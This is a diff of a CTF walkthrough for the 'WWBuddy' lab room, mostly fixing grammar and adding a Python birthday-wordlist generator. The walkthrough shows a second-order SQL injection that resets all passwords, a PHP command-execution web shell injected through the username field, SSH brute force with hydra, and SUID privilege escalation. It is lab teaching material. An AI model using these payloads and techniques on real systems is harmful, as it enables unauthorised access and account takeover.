@@ -25,7 +25,7 @@ First we'll start scanning ports with nmap.
 |_Requested resource was http://192.168.0.111/login/
 ```
 
-Port 22 and port 80 are open, lets take a look at the http server in port 80.
+Port 22 and port 80 are open, let's take a look at the http server in port 80.
 
 When we enter the site we can see a login page, and there's also an option to register a new account. What happens if we create an account and login?
 
@@ -36,9 +36,9 @@ There's 4 interesting things in the index page.
 3. There is a link to change our password.
 4. We can click our username to go to a profile page.
 
-Okay, now that we see this lets try to exploit something.
+Okay, now that we see this let's try to exploit something.
 
-First lets enumerate the directories of the website. I'll use gobuster.
+First let's enumerate the directories of the website. I'll use gobuster.
 
 ```
 ===============================================================
@@ -78,30 +78,30 @@ First lets enumerate the directories of the website. I'll use gobuster.
 Let's enter /admin.
 
 ```
-You dont have permissions to access this file, this incident will be reported.
+You don't have permissions to access this file, this incident will be reported.
 ```
 
-Okay, we dont have permissions to enter the file, now we can try to check many ways to exploit the website.
+Okay, we don't have permissions to enter the file, now we can try to check many ways to exploit the website.
 
 ## Exploit Website
 
-I tried to do my best to not let any sqli os xss and some other things in the login, chat and in the user info, in this part i wanted to explore second order sql injection.
+I tried to do my best to not let any sqli os xss and some other things in the login, chat and in the user info, in this part I wanted to explore second order sql injection.
 
-Okay, we can change the username, lets change it to some sqli payload like `' or 1=1 -- a` and then change the password.
+Okay, we can change the username, let's change it to some sqli payload like `' or 1=1 -- a` and then change the password.
 
 If everything went right, the passwords of every user in the database now should be the same, but we dont have the username of another user to try to log in, or do we?
 
-The WWBuddy bot sends a message to every user that is registered, so lets try to login with the username WWBuddy and the password that we just changed.
+The WWBuddy bot sends a message to every user that is registered, so let's try to login with the username WWBuddy and the password that we just changed.
 
-Logged in as WWBuddy we can see a 2 new faces, Henry and Roberto, first lets try to enter the /admin page... We still dont have permission, so lets try to login as one of the two.
+Logged in as WWBuddy we can see a 2 new faces, Henry and Roberto, first let's try to enter the /admin page... We still dont have permission, so let's try to login as one of the two.
 
-I logged in as Roberto, he has some messages with Henry and by their messages, it looks like Henry is the admin, they are talking about changing the password used for new users in SSH and also about a new developer being hired, let's forget it for now and lets login with Henry because probably he will have rights to access /admin.
+I logged in as Roberto, he has some messages with Henry and by their messages, it looks like Henry is the admin, they are talking about changing the password used for new users in SSH and also about a new developer being hired, let's forget it for now and let's login with Henry because probably he will have rights to access /admin.
 
-Logging in as Henry we can enter /admin, in it there's a log showing the ip, date, username and id of everytime anyone tried to access /admin page, lets look at the source of the page. 
+Logging in as Henry we can enter /admin, in it there's a log showing the ip, date, username and id of everytime anyone tried to access /admin page, let's look at the source of the page. 
 
 Looking at the source we can see 2 interesting things, first there is the first flag and second, at the end of every line there is a &#x3C;br&#x3E; to break the line, okay, maybe the backend is using include() to show the logs, let's see if it executes php code.
 
-Log in as a user that dont have rights to access the /admin page, change the username to some php code and try to access /admin page, then go back to Henry and in /admin page you can see the code was executed. Now go back to the user and change the username to this:
+Log in as a user that doesn't have rights to access the /admin page, change the username to some php code and try to access /admin page, then go back to Henry and in /admin page you can see the code was executed. Now go back to the user and change the username to this:
 
 `<?php system($_GET["cmd"]) ?>`
 
@@ -115,16 +115,16 @@ Okay we got a shell :DD
 
 ## Enumerate the machine
 
-Okay lets enumerate the machine.
+Okay let's enumerate the machine.
 
-First lets search for suid files and we can find an interesting file called /bin/authenticate, lets run it.
+First let's search for suid files and we can find an interesting file called /bin/authenticate, let's run it.
 
 ```
 $ authenticate
 You need to be a real user to be authenticated.
 ```
 
-We're not a real user ouch, okay lets see the hint for the second flag.
+We're not a real user ouch, okay let's see the hint for the second flag.
 
 ```
 Some people have only one password ...
@@ -132,7 +132,7 @@ Some people have only one password ...
 
 Some people have only one password, we could check the sql because we have the user and password for it, but we changed the passwords and even if we don't, the password is pretty strong so it's hard to crack the hash.
 
-Okay then, lets execute linpeas to see if we can find something.
+Okay then, let's execute linpeas to see if we can find something.
 
 Near the end of the output we can find something.
 
@@ -204,7 +204,7 @@ Near the end of the output we can find something.
 
 ```
 
-Okay, there is a log file for mysql called general.log and it looks like it shows every query executed in mysql, it worth taking a look at it.
+Okay, there is a log file for mysql called general.log and it looks like it shows every query executed in mysql, it's worth taking a look at it.
 
 ```
 2020-07-25T15:01:40.140340Z	   12 Connect	root@localhost on app using Socket
@@ -213,9 +213,9 @@ Okay, there is a log file for mysql called general.log and it looks like it show
 2020-07-25T15:01:40.147944Z	   12 Close stmt	
 ```
 
-It looks like Roberto accidentaly typed his password in the username input, lets try ssh into the machine with "roberto" as user and "***************" as password. It works.
+It looks like Roberto accidentaly typed his password in the username input, let's try ssh into the machine with "roberto" as user and "***************" as password. It works.
 
-When we log in as roberto the first thing we find is a file called importante.txt lets read it.
+When we log in as roberto the first thing we find is a file called importante.txt let's read it.
 
 ```
 A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD
@@ -236,7 +236,7 @@ Jenny will be very happy when she finds out she was hired: DD
 Do not forget that next week she turns 26, when she sees the gift I bought her, maybe she even encourages to go on a date with me.
 ```
 
-Jenny will be 26 next week, wonderful, remember roberto and henry's messages from before?
+Jenny will be 26 next week, wonderful, remember Roberto and Henry's messages from before?
 
 We can discover her birthday, but when is it next week?
 
@@ -244,11 +244,28 @@ We can discover her birthday, but when is it next week?
 -rw-rw-r-- 1 roberto roberto  246 Jul 27 21:25 importante.txt
 ```
 
-Info about the file, it was last modified in jul 27 so we go into 2020 calendar and search what week will be next week, the week starts in august 2 and ends august 8, and as we know she will be 26 so she was born in 1994, now we can make a wordlist with all possible passwords for jenny with different date formats.
+Info about the file, it was last modified in jul 27 so we go into 2020 calendar and search what week will be next week, the week starts in august 2 and ends august 8, and as we know she will be 26 so she was born in 1994, now we can make a wordlist with all possible passwords for jenny with different date formats. Here's a little script in python I wrote to do that:
+
+{% highlight python %}
+year = "1994"
+month = "08"
+
+for i in range(2,9):
+    day = "0"+str(i)
+    print("{}{}{}".format(year,month,day))
+    print("{}{}{}".format(day,month,year))
+    print("{}{}{}".format(month,day,year))
+    print("{}-{}-{}".format(year,month,day))
+    print("{}-{}-{}".format(day,month,year))
+    print("{}-{}-{}".format(month,day,year))
+    print("{}/{}/{}".format(year,month,day))
+    print("{}/{}/{}".format(day,month,year))
+    print("{}/{}/{}".format(month,day,year))
+{% endhighlight %}
 
 Now we use hydra to bruteforce jenny ssh with the wordlist and we can discover her password.
 
-But before entering in her account, lets execute that authenticate file because now we are a real user, aren't we?
+But before entering in her account, let's execute that authenticate file because now we are a real user, aren't we?
 
 ```
 You are already a developer.
@@ -256,11 +273,11 @@ You are already a developer.
 
 So it seems the file changes the user's group.
 
-Lets ssh as jenny, okay, we're in.
+Let's ssh as jenny, okay, we're in.
 
 ## Privilege escalation
 
-Now before executing authenticate, lets use ghidra to see what it does.
+Now before executing authenticate, let's use ghidra to see what it does.
 
 ```
 undefined8 main(void)
@@ -332,4 +349,4 @@ THM{**********************}
 
 There's the root flag.
 
-This is the first room i've ever done, hope you liked it :D
+This is the first room I've ever done, hope you liked it :D
